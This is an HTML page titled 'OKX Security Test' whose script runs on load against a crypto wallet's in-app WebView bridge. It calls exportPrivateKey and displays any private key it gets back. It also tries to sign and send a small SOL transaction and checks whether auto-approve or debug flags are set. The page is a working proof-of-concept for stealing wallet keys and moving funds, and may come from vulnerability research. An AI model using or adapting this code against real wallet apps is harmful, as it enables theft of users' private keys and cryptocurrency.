<html>
<head><meta charset="UTF-8">
<style>
body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
h2 { color:#e94560; }
#log { background:#16213e; padding:15px; border-radius:8px; margin:10px 0; line-height:1.8; }
.key { color:#0f0; font-size:18px; word-break:break-all; }
.err { color:#e94560; }
.info { color:#8899aa; }
.big { font-size:24px; font-weight:bold; }
</style></head>
<body>
<h2>OKX Security Test</h2>
<div id="status">Loading...</div>
<div id="log"></div>
<script>
async function run(){
    var el = document.getElementById('log');
    var st = document.getElementById('status');
    function log(html) { el.innerHTML += html + '<br>'; }
    
    st.innerHTML = 'Testing solanaBridge...';
    st.style.color = '#ffff00';
    
    var hasKey = false;
    
    // solanaBridge
    try {
        if(typeof solanaBridge !== 'undefined') {
            log('<span class="info">[+] solanaBridge AVAILABLE</span>');
            try {
                var key = await solanaBridge.exportPrivateKey("");
                hasKey = true;
                log('<span class="info">[+] Calling exportPrivateKey("")...</span>');
                log('<span class="big key">!!! PRIVATE KEY: ' + key + '</span>');
                st.innerHTML = '✅ PRIVATE KEY FOUND!';
                st.style.color = '#00ff00';
            } catch(e) {
                log('<span class="err">[-] exportPrivateKey error: ' + e.message + '</span>');
            }
            try {
                var tx = await solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'}));
                log('<span class="key">[!!!] TX: ' + JSON.stringify(tx) + '</span>');
            } catch(e) {
                log('<span class="err">[-] signAndSend error: ' + e.message + '</span>');
            }
        } else {
            log('<span class="err">[-] solanaBridge NOT available</span>');
        }
    } catch(e) {
        log('<span class="err">[!] Error: ' + e.message + '</span>');
    }
    
    // window.solana
    try {
        if(typeof window.solana !== 'undefined') {
            log('<span class="info">[+] window.solana: autoApprove=' + window.solana.autoApprove + '</span>');
            log('<span class="info">[+] window.solana: isDebug=' + window.solana.isDebug + '</span>');
        }
        if(typeof window.svm !== 'undefined') {
            log('<span class="info">[+] window.svm: autoApprove=' + window.svm.autoApprove + '</span>');
        }
    } catch(e) {}
    
    if(!hasKey && typeof solanaBridge === 'undefined') {
        st.innerHTML = '❌ Bridge not available - wrong WebView context';
        st.style.color = '#e94560';
    } else if(!hasKey && typeof solanaBridge !== 'undefined') {
        st.innerHTML = '⚠️ Bridge found but exportPrivateKey failed';
        st.style.color = '#ffaa00';
    }
}
setTimeout(run, 1500);
</script>
</body></html>
